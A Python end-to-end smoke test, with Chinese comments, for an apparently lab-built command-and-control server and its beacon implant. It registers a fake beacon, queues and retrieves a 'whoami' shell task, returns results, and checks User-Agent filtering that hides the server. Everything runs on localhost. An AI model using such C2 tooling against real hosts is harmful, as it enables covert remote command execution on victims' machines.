#!/usr/bin/env python3
"""lab-c2/tools/smoketest.py - C2 端到端冒烟测试

在同进程内起服务端(共享 SESSIONS), 用与 beacon.cpp 完全相同的报文格式跑一遍:
注册 -> 领任务 -> 回传结果 -> UA 校验。
用途: 改协议/改 UA 之后先跑这个, 再去编 C++。
"""
import asyncio
import json
import os
import sys
import threading
import time
import urllib.error
import urllib.request

from aiohttp import web

ROOT = os.path.abspath(os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))
sys.path.insert(0, ROOT)
import c2_server as srv  # noqa: E402

PORT = 8099
BASE = f"http://127.0.0.1:{PORT}"
SID = "11111111-2222-3333-4444-555555555555"
FAIL = []


def post(path, payload, ua=None):
    req = urllib.request.Request(
        BASE + path,
        data=json.dumps(payload).encode(),
        headers={"User-Agent": ua or srv.UA, "Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=5) as r:
        return json.loads(r.read().decode())


def check(name, ok, detail=""):
    print(("  [ok]   " if ok else "  [FAIL] ") + name + (f"  {detail}" if detail else ""))
    if not ok:
        FAIL.append(name)


def serve():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    runner = web.AppRunner(srv.build_app())
    loop.run_until_complete(runner.setup())
    loop.run_until_complete(web.TCPSite(runner, "127.0.0.1", PORT).start())
    loop.run_forever()


def beacon_payload():
    return {"id": SID, "host": "LAB-VM", "user": "yg", "os": "Windows",
            "arch": "x64", "pid": 4242, "pwd": "C:\\"}


def main():
    threading.Thread(target=serve, daemon=True).start()
    for _ in range(50):
        try:
            urllib.request.urlopen(BASE + "/", timeout=1).read()
            break
        except Exception:
            time.sleep(0.1)
    else:
        print("[-] 服务端未起来")
        return 1

    print("1) 信标注册")
    r = post(srv.BEACON_URI, beacon_payload())
    check("首次心跳返回空任务表", r == {"tasks": []}, repr(r))
    s = srv.SESSIONS.get(SID, {})
    check("会话已登记且字段解析正确",
          s.get("host") == "LAB-VM" and s.get("user") == "yg" and s.get("pid") == 4242,
          f"host={s.get('host')} user={s.get('user')} pid={s.get('pid')}")

    print("2) 任务下发 (等效操作台 exec whoami)")
    tid = srv.push(SID, "shell", "whoami")
    r = post(srv.BEACON_URI, beacon_payload())
    tasks = r.get("tasks", [])
    check("领到 1 个 shell 任务且参数完整",
          len(tasks) == 1 and tasks[0]["type"] == "shell"
          and tasks[0]["a"] == "whoami" and tasks[0]["id"] == tid, repr(r))
    check("队列已清空", post(srv.BEACON_URI, beacon_payload()) == {"tasks": []})

    print("3) 结果回传")
    t = post(srv.RESULT_URI, {"id": SID, "task": tid, "type": "shell",
                              "encoding": "base64", "out": "bGFiXFln"})
    check("回执 ok", t == {"ok": True}, repr(t))
    check("服务端已存档结果", len(srv.SESSIONS[SID]["results"]) == 1)

    print("4) 指纹校验")
    try:
        post(srv.BEACON_URI, beacon_payload(), ua="curl/8.0")
        check("错误 UA 被拦为 404", False, "竟然放行了")
    except urllib.error.HTTPError as e:
        check("错误 UA 被拦为 404", e.code == 404, f"HTTP {e.code}")

    print()
    print("结果: " + ("端到端通过" if not FAIL else f"{len(FAIL)} 项失败: {FAIL}"))
    return 1 if FAIL else 0


if __name__ == "__main__":
    sys.exit(main())
